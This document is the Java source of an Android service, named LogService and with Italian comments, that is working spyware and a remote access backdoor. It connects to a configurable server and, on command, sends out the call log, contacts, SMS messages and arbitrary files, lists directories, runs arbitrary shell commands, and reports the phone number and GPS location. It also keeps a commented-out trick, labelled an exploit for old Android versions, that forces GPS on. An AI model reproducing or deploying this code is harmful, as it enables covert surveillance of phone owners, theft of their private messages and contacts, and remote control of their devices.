package com.example.test.test;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStreamWriter;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class LogService extends IntentService {
    public LogService() {
        super("LogService");
    }

    @Override
    protected void onHandleIntent(Intent i) {


    try{
        final String host = "127.0.0.1";    //Qui l'IP
        final int portNumber = 7992;        //Qui la Porta del Server

        while (true) {
            Socket socket = new Socket(host, portNumber);

            InputStreamReader isr = new InputStreamReader(socket.getInputStream());
            BufferedReader in = new BufferedReader(isr);

            OutputStreamWriter osw = new OutputStreamWriter(socket.getOutputStream());
            BufferedWriter bw = new BufferedWriter(osw);
            PrintWriter out = new PrintWriter(bw,true);

            String str = in.readLine();

            if("lista_chiamate".equalsIgnoreCase(str)){
                Uri allCalls = Uri.parse("content://call_log/calls");
                Cursor c = getContentResolver().query(allCalls, null, null, null, null);

                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));// for  number
                    String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name
                    String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));// for duration
                    int type = Integer.parseInt(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)));

                    out.println(num+ " : "+name+" : "+duration);
                }
                out.println("end");
                c.close();

            }

            if("contatti".equalsIgnoreCase(str)){
                Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
                while (phones.moveToNext())
                {
                    String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

                    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    out.println(name+" : "+phoneNumber);

                }
                out.println("end");
                phones.close();
            }

            if("sms".equalsIgnoreCase(str)){
                String sms = "";
                Uri SMSURI = Uri.parse("content://sms/");
                Cursor cur = getContentResolver().query(SMSURI,null,null,null,null);
                while(cur.moveToNext()){
                   sms += "From: " + cur.getString(cur.getColumnIndexOrThrow("address")) + " : " + cur.getString(cur.getColumnIndexOrThrow("date")) + " : " + cur.getString(cur.getColumnIndexOrThrow("body"));
                    out.println(sms);
                }
                out.println("end");
            }

            if("download".equalsIgnoreCase(str)){
                String path = in.readLine();
                File file = new File (path);

                if(file.exists()) {
                    out.println("invio");
                    DataOutputStream output = new DataOutputStream(socket.getOutputStream());
                    FileInputStream fileIn = new FileInputStream(path);
                    byte[] buf = new byte[Short.MAX_VALUE];
                    int bytesRead;
                    while( (bytesRead = fileIn.read(buf)) != -1 ) {
                        output.writeShort(bytesRead);
                        output.write(buf,0,bytesRead);
                    }
                    output.writeShort(-1);
                    fileIn.close();

                }else{
                    out.println("end");
                }
            }

            if("lista_file".equalsIgnoreCase(str)){
                String path = in.readLine();

                File f = new File(path);
                final File file[] = f.listFiles();

                if(file != null){

                    for (int x=0; x < file.length; x++)
                    {

                        try {
                            out.println(file[x].getName());
                        }catch(Exception a){
                            out.println("eccezione");
                        }
                    }
                }
                out.println("end");
            }

            if("esegui".equalsIgnoreCase(str)){
                String cmd = in.readLine();

                Process p;
                StringBuffer output = new StringBuffer();
                try {
                    p = Runtime.getRuntime().exec(cmd);
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(p.getInputStream()));
                    String line = "";
                    while ((line = reader.readLine()) != null) {
                        output.append(line + "\n");
                        out.println(line);
                        p.waitFor();
                    }
                    out.println("end");
                }
                catch (IOException e) {
                    out.println("end");
                } catch (InterruptedException e) {
                    out.println("end");
                }
                String response = output.toString();
            }

            if("versione".equalsIgnoreCase(str)){

                String versionCode = Build.VERSION.RELEASE;
                out.println(versionCode);
            }

            if("numero".equalsIgnoreCase(str)){
                TelephonyManager tMgr =(TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
                if(tMgr != null) {
                    String mPhoneNumber = tMgr.getLine1Number();
                    try {
                        out.println(mPhoneNumber);

                    }catch(Exception a){
                        out.println("eccezione");
                    }
                }
            }
            //Problemi con questa funzione
            if("posizione".equalsIgnoreCase(str)){
                /* Exploit for Android < 2.3.3
                String provider = android.provider.Settings.Secure.getString(
                        getContentResolver(),
                        android.provider.Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
                if (!provider.contains("gps")) { // if gps is disabled
                    final Intent poke = new Intent();
                    poke.setClassName("com.android.settings",
                            "com.android.settings.widget.SettingsAppWidgetProvider");
                    poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
                    poke.setData(Uri.parse("3"));
                    sendBroadcast(poke);
                }
                */


                GPSTracker tracker = new GPSTracker(this);
                if (!tracker.canGetLocation()) {

                    out.println("gps disablitato");
                    out.println(" ");
                } else {
                    double latitude = tracker.getLatitude();
                    double longitude = tracker.getLongitude();

                    try {
                        out.println(latitude);
                        out.println(longitude);

                    }catch(Exception a){
                        out.println("eccezione");
                        out.println(" ");
                    }

                }
            }


            if ("exit".equalsIgnoreCase(str)) {
                socket.close();
                break;
            }

        }


        }catch(Exception y){

        }
    }

    @Override
    public void onDestroy()
    {
    }
}
